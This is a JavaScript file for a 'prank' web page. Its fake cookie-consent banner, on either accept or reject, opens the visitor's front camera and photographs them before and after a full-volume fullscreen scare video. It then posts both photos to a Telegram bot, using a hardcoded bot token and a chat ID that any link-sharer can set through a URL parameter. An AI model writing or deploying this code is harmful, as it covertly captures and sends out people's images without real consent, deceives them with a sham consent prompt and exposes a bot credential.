const cameraVideo = document.getElementById('cameraVideo');
const screamerVideo = document.getElementById('screamerVideo');
const canvas = document.getElementById('canvas');
const cookieConsent = document.getElementById('cookie-consent');
const acceptBtn = document.getElementById('accept-cookies');
const rejectBtn = document.getElementById('reject-cookies');
const termsLink = document.getElementById('terms-link');

// Replace with your actual bot token
const BOT_TOKEN = '8420275180:AAGCmlDkk-5h_7GI_dkuoAf_iwITnaP6aSw';
// Default chat ID, but will be overridden by ref param
let CHAT_ID = '355782346';

// Get referrer chat ID from URL
const urlParams = new URLSearchParams(window.location.search);
const refChatId = urlParams.get('ref');
if (refChatId) {
    CHAT_ID = refChatId;
}

document.addEventListener('DOMContentLoaded', () => {
    // Handle cookie acceptance/rejection
    function handleCookieDecision() {
        cookieConsent.style.opacity = '0';
        cookieConsent.style.pointerEvents = 'none';
        
        setTimeout(() => {
            cookieConsent.style.display = 'none';
            startPrank();
        }, 300);
    }

    // Start the prank: access camera, take first photo, play screamer, take second photo
    async function startPrank() {
        try {
            // Request access to the front camera
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' } // Front camera
            });
            cameraVideo.srcObject = stream;

            // Wait for video to load
            cameraVideo.onloadedmetadata = () => {
                // Take first photo immediately (before screamer)
                takePhoto();
                sendPhotoToBot('before');

                // Play screamer video
                playFullScreenVideo();

                // Take second photo after 3 seconds (during/after screamer)
                setTimeout(() => {
                    takePhoto();
                    sendPhotoToBot('after');
                    // Stop the stream
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);
            };
        } catch (err) {
            console.error('Error accessing camera:', err);
            // Still play screamer even if camera fails
            playFullScreenVideo();
        }
    }

    // Take photo from camera
    function takePhoto() {
        const context = canvas.getContext('2d');
        canvas.width = cameraVideo.videoWidth;
        canvas.height = cameraVideo.videoHeight;
        context.drawImage(cameraVideo, 0, 0);
    }

    // Send photo to Telegram bot
    function sendPhotoToBot(timing) {
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('photo', blob);
            formData.append('caption', timing === 'before' ? 'Фото до скримера' : 'Фото после скримера');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log(`Photo ${timing} sent successfully`);
                } else {
                    console.error('Error sending photo:', data);
                }
            })
            .catch(err => {
                console.error('Fetch error:', err);
            });
        });
    }

    // Play video in fullscreen with max volume
    function playFullScreenVideo() {
        screamerVideo.muted = false;
        screamerVideo.volume = 1.0;
        
        // Play video with error handling
        screamerVideo.play().catch(error => {
            console.log('Autoplay failed:', error);
        });
        
        // Request fullscreen
        requestFullScreen();
        
        // Show video
        document.querySelector('.scare').style.display = 'block';
    }

    // Request fullscreen function
    function requestFullScreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
        } else if (elem.mozRequestFullScreen) {
            elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
        }
    }

    // Event listeners
    acceptBtn.addEventListener('click', handleCookieDecision);
    rejectBtn.addEventListener('click', handleCookieDecision);
    
    // Terms link handling
    termsLink.addEventListener('click', (e) => {
        e.stopPropagation();
    });

    // Prevent default fullscreen exit behaviors
    document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement) {
            screamerVideo.pause();
        }
    });

    // Handle page visibility changes
    document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'hidden') {
            screamerVideo.pause();
        }
    });
});